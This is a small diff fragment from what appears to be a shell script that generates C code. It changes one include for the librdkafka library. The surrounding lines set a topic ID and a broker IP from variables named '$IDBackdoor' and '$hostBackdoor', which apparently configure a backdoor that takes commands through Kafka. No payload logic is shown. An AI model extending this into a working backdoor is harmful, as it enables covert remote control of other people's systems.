@@ -123,7 +123,7 @@ echo "#include <stdio.h>
 #include <sys/time.h>
 #include <pthread.h>
 
-#include <librdkafka/rdkafka.h>
+#include \"rdkafka.h\"
 
 #define TOPICO_ID \"$IDBackdoor\"
 #define BROKER_IP \"$hostBackdoor\"
